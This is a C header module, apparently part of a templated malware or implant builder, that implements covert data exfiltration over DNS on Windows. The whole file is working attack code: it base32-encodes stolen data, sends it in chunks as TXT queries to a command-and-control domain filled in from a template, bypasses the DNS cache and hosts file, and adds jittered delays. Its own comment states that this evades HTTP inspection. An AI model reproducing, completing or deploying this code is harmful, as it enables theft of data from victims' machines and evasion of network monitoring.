// chunk: exfil/dns_txt
// depends: core/emit_buffer
// provides: exfiltrate
// headers: winsock2.h, ws2tcpip.h, windns.h
// libs: ws2_32, dnsapi
// note: DNS TXT queries with base32-encoded data — bypasses HTTP inspection

#ifndef CHUNK_DNS_TXT
#define CHUNK_DNS_TXT

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windns.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static const char _b32[] = "abcdefghijklmnopqrstuvwxyz234567";

static int _b32_encode(const unsigned char *in, int inlen, char *out, int outmax) {
    int o = 0, bits = 0, accum = 0;
    for (int i = 0; i < inlen && o < outmax - 1; i++) {
        accum = (accum << 8) | in[i];
        bits += 8;
        while (bits >= 5 && o < outmax - 1) {
            bits -= 5;
            out[o++] = _b32[(accum >> bits) & 31];
        }
    }
    if (bits > 0 && o < outmax - 1)
        out[o++] = _b32[(accum << (5 - bits)) & 31];
    out[o] = 0;
    return o;
}

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    (void)port;
    DWORD chunk_sz = 30;
    DWORD seq = 0;
    DWORD offset = 0;

    while (offset < len) {
        DWORD this_chunk = (len - offset > chunk_sz) ? chunk_sz : (len - offset);
        char encoded[128];
        _b32_encode((const unsigned char *)data + offset, this_chunk, encoded, sizeof(encoded));

        // Split encoded data into DNS-safe labels (<63 chars)
        // Query format: <seq>.<label1>.<label2>.d.<c2domain>
        char query[256];
        snprintf(query, sizeof(query), "%u.%s.d.%s", seq, encoded, ip);

        PDNS_RECORD pRec = NULL;
        DnsQuery_A(query, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
                   NULL, &pRec, NULL);
        if (pRec) DnsRecordListFree(pRec, DnsFreeRecordList);

        offset += this_chunk;
        seq++;
        Sleep(10 + (seq % 50));
    }

    // Signal end
    char end_query[256];
    snprintf(end_query, sizeof(end_query), "fin.%u.d.%s", seq, ip);
    PDNS_RECORD pEnd = NULL;
    DnsQuery_A(end_query, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE, NULL, &pEnd, NULL);
    if (pEnd) DnsRecordListFree(pEnd, DnsFreeRecordList);

    return TRUE;
}

#endif
